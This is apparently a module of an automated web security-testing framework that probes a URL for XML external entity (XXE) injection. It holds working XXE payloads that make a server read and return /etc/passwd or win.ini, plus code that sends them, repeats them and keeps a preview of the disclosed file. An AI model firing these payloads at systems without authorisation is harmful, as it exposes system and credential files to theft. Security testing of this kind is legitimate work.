"""XXE — prove external entity expansion from an XML endpoint.

The XML module could report that an endpoint parses XML and that a DOCTYPE
looked reachable, but no registered action could turn that into a file read.
This sends one entity that resolves to a local file and requires the file's
content in the response, with a plain-XML baseline so a page that already
contains "root:x:0:0:" is not mistaken for a disclosure.

Read-only: the payloads only reference files. Nothing is written and no
outbound callback is used, so the proof does not depend on a listener being
reachable from the target.
"""

from actions.registry import action, ActionContext, ActionResult
from actions.web.http_util import body as _body, session_headers, status as _status
from tools.wrappers import curl

_BASELINE_XML = '<?xml version="1.0"?><bhs_probe>ok</bhs_probe>'

# (payload, content markers). A marker must be absent from the baseline: the
# page may legitimately print "root:x:0:0:" from a documentation example.
_PAYLOADS = (
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
     '"file:///etc/passwd">]><r>&x;</r>',
     ("root:x:0:0:", "root:*:0:0:", "daemon:x:", "nobody:x:")),
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
     '"file:///c:/windows/win.ini">]><r>&x;</r>',
     ("[extensions]", "[fonts]", "for 16-bit app support")),
)


@action(
    id="web.xxe.detect",
    risk="MEDIUM",
    detectability="medium",
    requires=["url"],
    produces="VulnCandidate",
    idempotent=True,
    description=(
        "Prove XXE by expanding a file:// entity against a plain XML "
        "baseline and requiring disclosed file content, reproduced twice."
    ),
    category="web",
)
async def xxe_detect(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    if not url:
        return ActionResult(False, error="url is required")
    headers = session_headers(ctx)
    headers.setdefault("Content-Type", "application/xml")

    baseline = await curl(url, method="POST", headers=headers,
                          data=_BASELINE_XML, output="full")
    if not (200 <= _status(baseline) < 400):
        return ActionResult(
            False, confidence="TENTATIVE",
            error=f"XML baseline rejected (HTTP {_status(baseline)})")
    baseline_body = _body(baseline)

    finding = None
    for payload, markers in _PAYLOADS:
        usable = [m for m in markers if m not in baseline_body]
        if not usable:
            continue
        raw = await curl(url, method="POST", headers=headers,
                         data=payload, output="full")
        body = _body(raw)
        if not (200 <= _status(raw) < 300):
            continue
        hit = next((m for m in usable if m in body), "")
        if not hit:
            continue
        again = await curl(url, method="POST", headers=headers,
                           data=payload, output="full")
        if hit not in _body(again):
            continue
        finding = {
            "url": url,
            "marker": hit,
            "entity": "file://",
            "status": _status(raw),
            # Disclosed content can carry credentials; keep it short and let
            # the persisted finding hold the marker, not the file.
            "body_preview": body[:400],
        }
        break

    if finding is None:
        return ActionResult(
            False, confidence="TENTATIVE",
            error="no external entity expansion reproduced")
    return ActionResult(
        True, confidence="CONFIRMED",
        data={"findings": [finding], "count": 1},
        evidence={"action": "web.xxe.detect", "marker": finding["marker"],
                  "payload": "file:///... entity"},
    )
